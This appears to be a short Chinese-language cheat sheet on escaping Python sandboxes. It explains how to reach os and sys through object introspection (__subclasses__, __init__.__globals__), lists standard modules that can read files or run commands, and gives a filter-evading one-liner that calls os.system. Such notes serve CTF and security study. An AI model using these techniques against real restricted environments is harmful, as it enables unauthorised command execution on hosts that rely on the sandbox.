## Python

`__builtins__`是以下模块的引用：

```
python2: __builtin__
python3: builtins
```



## Tactic

1.利用下面这种代码可以访问到一些模块：
```py
[].__class__.__base__.__subclasses__()
```

2.利用下面的代码可以访问某个模块导入的模块：
```py
module.__init__.__globals__
```

3.第一点访问的模块中有些模块是导入了`os`或`sys`模块的：
```py
python2:
<class 'site._Printer'>
<class 'site.Quitter'>
<class warnings.catch_warnings>
<class 'warnings.WarningMessage'>

python3:
<class '_sitebuiltins.Quitter'>
<class '_sitebuiltins._Printer'>
```
然后利用第二点就可以访问到os模块了

4.一些姿势可以看ref里的`abusing`和`n种姿势`

#### some interesting stdandard modules

```py


    https://docs.python.org/2/library/types.html   types.FileType 读取文件

    https://docs.python.org/2/library/timeit.html   timeit.timeit 执行代码

    https://docs.python.org/2/library/inspect.html 可以猜测代码结构，如： inspect.getmembers

    https://docs.python.org/2/library/pickle.html   pickle.loads 执行命令

    https://docs.python.org/2/library/os.html   os.popen 执行命令

    https://docs.python.org/2/library/commands.html   commands.getstatusoutput 执行命令

    https://docs.python.org/2/library/subprocess.html   subprocess.popen 执行命令

    https://docs.python.org/2/library/io.html   io.open 读取文件

    https://docs.python.org/2/library/platform.html   platform.popen 命令执行


```

#### final

一个栗子：
```py
python3:
[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('ls')
```

## Reference

* [bypassing-python-sandbox-by-abusing](http://pbiernat.blogspot.hk/2014/09/bypassing-python-sandbox-by-abusing.html)

* [python-sandbox-bypass](https://joychou.org/web/python-sandbox-bypass.html)

* [python-sandbox](http://www.g5amy.xyz/my_blog/python/python-sandbox/)

* [Python沙箱逃逸的n种姿势 ](https://mp.weixin.qq.com/s/PLI-yjqmA3gwk5w3KHzOyA)

* [Python可用于bypass Sandbox的标准库](http://www.0aa.me/index.php/archives/125/)